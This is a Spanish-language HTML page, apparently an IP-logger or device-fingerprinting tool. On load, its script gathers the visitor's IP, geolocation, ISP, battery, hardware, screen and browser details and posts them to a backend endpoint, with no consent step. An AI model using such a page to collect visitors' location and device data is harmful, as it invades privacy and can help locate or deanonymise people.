<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <title>474747 - Device Info</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: #0b0b0b;
      color: #e5e5e5;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }
    .card {
      background: #161616;
      border: 1px solid #2a2a2a;
      border-radius: 18px;
      padding: 26px 22px;
      max-width: 420px;
      width: 100%;
      box-shadow: 0 12px 40px rgba(0,0,0,0.5);
    }
    .codigo {
      font-size: 0.8rem;
      color: #666;
      letter-spacing: 3px;
      font-weight: 500;
      margin-bottom: 2px;
    }
    h1 {
      font-size: 1.55rem;
      font-weight: 700;
      color: #fff;
      margin-bottom: 10px;
    }
    .status {
      font-size: 0.92rem;
      color: #999;
      margin-bottom: 18px;
      min-height: 22px;
    }
    .status.ok { color: #4ade80; }
    .status.error { color: #f87171; }
    .status.loading { color: #60a5fa; }
    .info {
      font-size: 0.87rem;
      line-height: 1.75;
      color: #b0b0b0;
    }
    .info b {
      color: #ddd;
      font-weight: 600;
    }
    .divider {
      height: 1px;
      background: #2a2a2a;
      margin: 14px 0;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="codigo">474747</div>
    <h1>Device Info</h1>
    <p class="status loading" id="status">Recolectando información...</p>
    <div class="info" id="info"></div>
  </div>

  <script>
    async function enviarInfo() {
      const statusEl = document.getElementById("status");
      const infoEl = document.getElementById("info");

      const data = {
        // Red
        ip: "",
        country: "",
        city: "",
        region: "",
        isp: "",
        conexion: "No disponible",
        tipoRed: "Desconocido",
        rtt: "N/A",

        // Dispositivo
        os: navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform) || "Desconocido",
        browser: "Desconocido",
        device: /Mobi|Android|iPhone|iPad/i.test(navigator.userAgent) ? "Móvil" : "PC",
        ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Desconocida",
        nucleos: navigator.hardwareConcurrency || "Desconocido",
        pantalla: window.screen.width + " × " + window.screen.height,
        pixelRatio: window.devicePixelRatio || 1,
        orientacion: (screen.orientation && screen.orientation.type) || "Desconocida",
        colorDepth: (screen.colorDepth || "?") + " bits",

        // Batería
        bateria: "No disponible",
        cargando: "No disponible",

        // Idioma / zona
        idioma: navigator.language || "Desconocido",
        zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",

        // Otras
        toque: ("ontouchstart" in window) ? "Sí" : "No",
        cookies: navigator.cookieEnabled ? "Sí" : "No",
        online: navigator.onLine ? "Sí" : "No",
        maxTouchPoints: navigator.maxTouchPoints || 0,
        webdriver: navigator.webdriver ? "Sí" : "No",
        userAgent: navigator.userAgent || ""
      };

      // Conexión
      if (navigator.connection) {
        const c = navigator.connection;
        data.conexion = (c.effectiveType || "?") + " / " + (c.downlink || "?") + " Mbps";
        data.tipoRed = c.type || "Desconocido";
        data.rtt = c.rtt ? c.rtt + " ms" : "N/A";
      }

      // Navegador
      const ua = navigator.userAgent;
      if (ua.includes("Edg")) data.browser = "Edge";
      else if (ua.includes("OPR") || ua.includes("Opera")) data.browser = "Opera";
      else if (ua.includes("Chrome")) data.browser = "Chrome";
      else if (ua.includes("Firefox")) data.browser = "Firefox";
      else if (ua.includes("Safari")) data.browser = "Safari";

      // Batería
      if (navigator.getBattery) {
        try {
          const bat = await navigator.getBattery();
          data.bateria = Math.round(bat.level * 100) + "%";
          data.cargando = bat.charging ? "Cargando" : "Descargando";
        } catch (e) {}
      }

      // IP + geolocalización
      try {
        const geo = await fetch("https://ipapi.co/json/", { cache: "no-store" }).then(r => r.json());
        data.ip = geo.ip || "";
        data.country = geo.country_name || "";
        data.city = geo.city || "";
        data.region = geo.region || "";
        data.isp = geo.org || "";
      } catch (e) {
        try {
          const geo2 = await fetch("https://ipinfo.io/json", { cache: "no-store" }).then(r => r.json());
          data.ip = geo2.ip || "";
          data.country = geo2.country || "";
          data.city = geo2.city || "";
          data.isp = geo2.org || "";
        } catch (e2) {}
      }

      // Mostrar en pantalla (sin template literals raros)
      infoEl.innerHTML =
        "<b>IP:</b> " + (data.ip || "—") + "<br>" +
        "<b>País:</b> " + (data.country || "—") + (data.city ? " · " + data.city : "") + "<br>" +
        "<b>ISP:</b> " + (data.isp || "—") + "<br>" +
        "<b>Conexión:</b> " + data.conexion + "<br>" +
        "<div class='divider'></div>" +
        "<b>OS:</b> " + data.os + "<br>" +
        "<b>Navegador:</b> " + data.browser + "<br>" +
        "<b>Dispositivo:</b> " + data.device + "<br>" +
        "<b>Pantalla:</b> " + data.pantalla + " (" + data.pixelRatio + "x)<br>" +
        "<b>RAM:</b> " + data.ram + " · <b>Núcleos:</b> " + data.nucleos + "<br>" +
        "<b>Batería:</b> " + data.bateria + " · " + data.cargando + "<br>" +
        "<div class='divider'></div>" +
        "<b>Idioma:</b> " + data.idioma + "<br>" +
        "<b>Zona:</b> " + data.zonaHoraria;

      // Enviar a la Function
      statusEl.textContent = "Enviando...";
      statusEl.className = "status loading";

      try {
        const res = await fetch("/api/device", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });

        const text = await res.text();
        let result = null;
        try { result = JSON.parse(text); } catch (e) {}

        if (res.ok && result && result.success) {
          statusEl.textContent = "Información enviada correctamente";
          statusEl.className = "status ok";
        } else {
          statusEl.textContent = "Error al enviar (" + res.status + ")";
          statusEl.className = "status error";
          console.error("Respuesta:", text);
        }
      } catch (err) {
        statusEl.textContent = "Error de conexión";
        statusEl.className = "status error";
        console.error(err);
      }
    }

    enviarInfo();
  </script>
</body>
</html>
